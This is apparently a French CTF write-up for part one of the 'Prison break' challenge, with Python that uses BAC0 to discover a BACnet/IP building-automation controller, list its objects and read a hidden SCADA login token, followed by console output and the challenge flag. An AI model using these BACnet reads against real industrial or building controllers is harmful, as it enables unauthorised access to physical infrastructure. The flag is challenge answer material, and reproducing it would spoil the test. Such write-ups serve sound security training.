# Prison break 1/2

## Challenge
Dans cette première partie du challenge Prison break, vous manipulerez un automate de gestion technique de batîment dans une prison de haute sécurité. Cet automate dialogue avec une interface de supervision SCADA via le protocole BACnet/IP. La première étape de ce challenge est de récupérer un token présent dans la mémoire de l'automate afin de pouvoir accèder à l'interface web SCADA.

Pour cela, vous devrez lire dans les objets de l'automate à l'aide du protocole BACnet/IP et tenter de récupérer un token caché. Vous pourrez alors continuer la deuxième partie de l'épreuve à l'aide de ce token.

Les informations générales sur cette épreuve sont disponibles ici : https://france-cybersecurity-challenge.fr/prison-break

## Inputs
- SCADA interface at https://prison-break.france-cybersecurity-challenge.fr/
- Template python script: [prison-break-template.py](./prison-break-template.py)

## Solution
The template already implements the initialization of the `bacnet` client:
```python
    # Check the BAC0 version
    assert BAC0.version == "22.9.21", "Error: please use the BAC0 version 22.9.21"

    try:
        # Perform the resolution
        target = socket.gethostbyname("prison-break.france-cybersecurity-challenge.fr")
    except:
        print("Failed to resolve FQDN...")
        exit(-1)

    # Initialize the local BACnet client
    print("[+] Initiliaze local bacnet client")
    bacnet = BAC0.lite(ip = LOCAL_IP, port = LOCAL_PORT)
    print("[+] Initialization done")
```

After that, we need to send a `whois` request to the `target` which will discover the `devices` present on the `target`. Since we know nothing about the device itself, we can request to read the `objectList`. Among that `objectList`, there's a `characterstringValue` object present, which gives us the `token` we're looking for:

```python
    bacnet.whois(target)
    for _, (address, device_id) in enumerate(bacnet.discoveredDevices):
        print(f"device {address} {device_id}")
        objlist = bacnet.read(f"{address} device {device_id} objectList")
        print(f"{objlist=}")
        token = bacnet.read(f"{address} characterstringValue 1 description")
        print(f"{token=}")
```

Here's the console output showing the `objectList` and single `characterstringValue` object type holding the `token`:

```console
$ python3 prison-break-template.py
[+] Initiliaze local bacnet client
2024-04-09 15:17:22,361 - INFO    | Starting BAC0 version 22.9.21 (Lite)
2024-04-09 15:17:22,361 - INFO    | Use BAC0.log_level to adjust verbosity of the app.
2024-04-09 15:17:22,361 - INFO    | Ex. BAC0.log_level('silence') or BAC0.log_level('error')
2024-04-09 15:17:22,361 - INFO    | Starting TaskManager
2024-04-09 15:17:22,362 - INFO    | Using ip : 0xc0a8640793b0
2024-04-09 15:17:22,659 - INFO    | Starting app...
2024-04-09 15:17:22,660 - INFO    | BAC0 started
2024-04-09 15:17:22,660 - INFO    | Registered as Simple BACnet/IP App
2024-04-09 15:17:22,666 - INFO    | Update Local COV Task started
[+] Initialization done
device 141.94.246.228 1556938
objlist=[('device', 1556938), ('binaryValue', 1), ('binaryValue', 2), ('binaryValue', 3), ('binaryValue', 4), ('binaryValue', 5), ('binaryValue', 6), ('binaryValue', 7), ('binaryValue', 8), ('binaryValue', 9), ('binaryValue', 10), ('binaryValue', 11), ('binaryValue', 12), ('binaryValue', 13), ('binaryValue', 14), ('binaryValue', 15), ('binaryValue', 16), ('binaryValue', 17), ('binaryValue', 18), ('binaryValue', 19), ('binaryValue', 20), ('binaryValue', 21), ('binaryValue', 22), ('binaryValue', 23), ('binaryValue', 24), ('binaryValue', 25), ('binaryValue', 26), ('binaryValue', 27), ('binaryValue', 28), ('binaryValue', 29), ('binaryValue', 30), ('binaryValue', 31), ('binaryValue', 32), ('binaryValue', 33), ('binaryValue', 34), ('binaryValue', 35), ('binaryValue', 36), ('binaryValue', 37), ('binaryValue', 38), ('binaryValue', 39), ('binaryValue', 40), ('binaryValue', 41), ('binaryValue', 42), ('binaryValue', 43), ('binaryValue', 44), ('binaryValue', 45), ('binaryValue', 46), ('binaryValue', 47), ('binaryValue', 48), ('binaryValue', 49), ('binaryValue', 50), ('binaryValue', 51), ('analogValue', 1), ('analogValue', 2), ('analogValue', 3), ('analogValue', 4), ('characterstringValue', 1)]
token='328e0956240c04705d89b9cc1f1e7852'
```

With that `token`, we can connect to the `SCADA interface` and login.

Notice that the `token` rotates at each connection.

## Python code
Python code at [sol.py](./sol.py)

## Flag
> First flag: FCSC{2f3a395e619a213146d58e6e7e0758f4c66b7a65abca10bc96882a49df7fa2af}
